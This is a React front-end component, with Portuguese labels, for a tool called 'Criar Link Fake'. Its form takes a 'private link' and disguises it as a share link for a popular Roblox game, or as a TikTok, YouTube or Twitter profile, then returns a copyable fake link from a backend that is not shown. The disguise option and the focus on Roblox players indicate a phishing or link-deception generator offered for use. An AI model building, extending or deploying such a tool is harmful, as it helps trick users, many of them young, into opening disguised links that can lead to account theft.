import React, {useState, useContext} from 'react'
import { UserContext } from '../App'

const ROBLOX_GAMES = {
  "99 Noites": "https://www.roblox.com/share?code=4a3bfb1c8c8247458d7996f25d8cba65&type=Server",
  "Pls Donate": "https://www.roblox.com/pt/games/8737602449/PLS-DONATE",
  "Doors": "https://www.roblox.com/share?code=3e53b3c450edb044882857e27370bb77&type=Server",
  "Grow a garden": "https://www.roblox.com/share?code=b31ee3faf6f22a4fab1df07d32bf0646&type=Server",
  "Murder Mystery 2": "https://www.roblox.com/pt/games/142823291/Murder-Mystery-2",
  "Adopt Me": "https://www.roblox.com/share?code=a9ab77e67d758848b6100045442e61eb&type=Server",
  "Blue Lock": "https://www.roblox.com/share?code=5f5f0967e99e3a4c9f82421b51a9a4ff&type=Server",
  "Jujutsu Shinanigans": "https://www.roblox.com/share?code=234ad24be74f3f44aad2eebdc208555f&type=Server"
}

export default function LinkFake(){
  const {me} = useContext(UserContext)
  const [network, setNetwork] = useState('roblox')
  const [username, setUsername] = useState('')
  const [privateLink, setPrivateLink] = useState('')
  const [robloxGame, setRobloxGame] = useState(Object.values(ROBLOX_GAMES)[0])
  const [result, setResult] = useState(null)
  const [error, setError] = useState(null)

  async function handleCreate(e){
    e.preventDefault(); setError(null); setResult(null);
    if (!me) return setError('Você precisa logar com Discord para usar isso.')
    const payload = { network, username, privateLink, robloxGame }
    const res = await fetch('/api/create/linkfake', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload) })
    const data = await res.json();
    if (data.error) setError(data.error)
    else setResult(data)
  }

  return (
    <div className="max-w-xl" style={{margin:'0 auto'}}>
      <div className="card">
        <h3>Criar Link Fake</h3>
        <form onSubmit={handleCreate} style={{display:'grid', gap:10, marginTop:8}}>
          <label>Rede</label>
          <select value={network} onChange={e=>setNetwork(e.target.value)} className="nav-btn" style={{width:'100%'}}>
            <option value="roblox">Roblox</option>
            <option value="tiktok">TikTok</option>
            <option value="youtube">YouTube</option>
            <option value="twitter">Twitter / X</option>
          </select>

          {network !== 'roblox' && (
            <div>
              <label>Nome de usuário (ex: neymar1337)</label>
              <input value={username} onChange={e=>setUsername(e.target.value)} className="nav-btn" required />
            </div>
          )}

          <div>
            <label>Link privado (obrigatório)</label>
            <input value={privateLink} onChange={e=>setPrivateLink(e.target.value)} className="nav-btn" placeholder="https://www.roblox.com/share?code=..." required />
          </div>

          {network === 'roblox' && (
            <div>
              <label>Escolha o jogo para disfarçar</label>
              <select value={robloxGame} onChange={e=>setRobloxGame(e.target.value)} className="nav-btn">
                {Object.keys(ROBLOX_GAMES).map(k=> (<option key={k} value={ROBLOX_GAMES[k]}>{k}</option>))}
              </select>
            </div>
          )}

          <div>
            <button type="submit" className="nav-btn" style={{background:'var(--purple)'}}>Criar link privado</button>
          </div>
        </form>
      </div>

      {result && (
        <div className="card" style={{marginTop:12}}>
          <h4>Link gerado</h4>
          <pre style={{background:'#000', padding:10, borderRadius:8}}>{result.output}</pre>
          <div style={{display:'flex', gap:8, marginTop:8}}>
            <button onClick={()=>{ navigator.clipboard.writeText(result.output); alert('Link fake copiado') }} className="nav-btn" style={{background:'var(--purple)'}}>Copiar</button>
            <a href={result.link} className="nav-btn">Abrir</a>
          </div>
        </div>
      )}

      {error && <div style={{color:'#fca5a5', marginTop:8}}>{String(error)}</div>}
    </div>
  )
}
